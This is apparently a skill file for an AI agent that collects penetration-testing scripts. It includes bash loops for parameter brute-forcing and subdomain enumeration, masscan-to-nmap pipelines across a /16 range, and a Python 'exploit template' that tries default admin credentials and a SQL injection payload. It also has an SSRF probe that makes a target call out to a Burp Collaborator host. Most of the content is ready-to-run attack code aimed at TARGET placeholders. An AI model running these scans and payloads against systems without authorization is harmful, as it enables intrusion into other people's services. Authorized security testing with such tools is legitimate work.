---
name: tool-scripting
description: "Pentest scripting techniques — bash one-liners, Python exploit scripts, curl chaining, Burp Extender automation, jq parsing, grep pattern extraction for pentest workflows. Triggers: 'scripting', 'pentest script', 'bash script pentest', 'python exploit', 'curl chain', 'automation pentest', 'one liner', 'jq parse', 'grep extract'."
---

# Pentest Scripting Techniques

Automation scripts and one-liners for efficient testing workflows.

---

## Phase 1: Bash One-Liners

```bash
# Mass curl with status codes:
while IFS= read -r URL; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$URL" --max-time 5)
  echo "$CODE $URL"
done < urls.txt | sort | tee output/url_status.txt

# Parameter brute force:
for PARAM in $(cat /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt); do
  RESP=$(curl -sk "https://TARGET/page?$PARAM=test" -w "\n%{http_code}" | tail -1)
  [ "$RESP" != "404" ] && echo "FOUND param=$PARAM code=$RESP"
done | tee output/param_fuzz.txt

# Extract endpoints from JS files:
curl -s "https://TARGET/app.js" | grep -oE '"/api/[^"]{3,}"' | sort -u

# Subdomain alive check:
while IFS= read -r SUB; do
  IP=$(dig +short "$SUB.TARGET.com" | tail -1)
  [ -n "$IP" ] && echo "$SUB → $IP"
done < /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

---

## Phase 2: Python Exploit Templates

```python
#!/usr/bin/env python3
# Quick exploit template
import requests
import sys
from urllib.parse import quote

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"
session = requests.Session()
session.verify = False

# Auth (if needed):
resp = session.post(f"{TARGET}/login",
    json={"username": "admin", "password": "admin"},
    headers={"Content-Type": "application/json"})
print(f"Login: {resp.status_code}")

# Payload test:
payload = "' OR '1'='1"
resp = session.get(f"{TARGET}/api/user?id={quote(payload)}")
print(f"SQLi test: {resp.status_code} — {resp.text[:200]}")
```

```python
#!/usr/bin/env python3
# SSRF detection via DNS OOB
import requests, uuid

COLLABORATOR = "YOUR.burpcollaborator.net"
TARGET = "https://target.com/api/fetch"
ID = str(uuid.uuid4())[:8]

payload = f"http://{ID}.{COLLABORATOR}"
r = requests.post(TARGET, json={"url": payload})
print(f"Response: {r.status_code}")
print(f"Monitor DNS for: {ID}.{COLLABORATOR}")
```

---

## Phase 3: jq & Parsing Chains

```bash
# Parse Burp exported JSON:
cat burp_export.json | jq '.[] | {url: .host + .path, method: .method, status: .status}'

# Nuclei findings severity summary:
cat output/nuclei_all.txt | jq -r '.info.severity' | sort | uniq -c | sort -rn

# Extract unique parameters from gau output:
gau "target.com" | grep "?" | sed 's/=.*/=/' | sort -u | tee output/params.txt

# Masscan → Nmap pipeline:
masscan 10.0.0.0/16 -p1-65535 --rate 10000 -oG output/masscan.txt 2>/dev/null
awk '/open/{print $2}' output/masscan.txt | sort -u | xargs -I{} nmap -sV -p- {} -oN output/nmap_{}.txt 2>/dev/null
```

---

## Phase 4: Burp Suite Automation

```bash
# Start Burp headless for scanning:
java -jar burpsuite_pro.jar --collaborator-server \
  --project-file=pentest.burp --config-file=burp_config.json 2>/dev/null

# Burp REST API (if enabled):
curl -s "http://127.0.0.1:1337/v0.1/scope" | jq .

# Send request via Burp proxy:
curl -sk --proxy "http://127.0.0.1:8080" "https://TARGET/api/endpoint" \
  -H "Authorization: Bearer TOKEN" | jq .
```

---

## Output

Save to `output/`:
- `url_status.txt` — URL reachability results
- `param_fuzz.txt` — discovered parameters

## Next Phase

→ Use discovered endpoints with `vuln-ssrf`, `vuln-sqli`, etc.
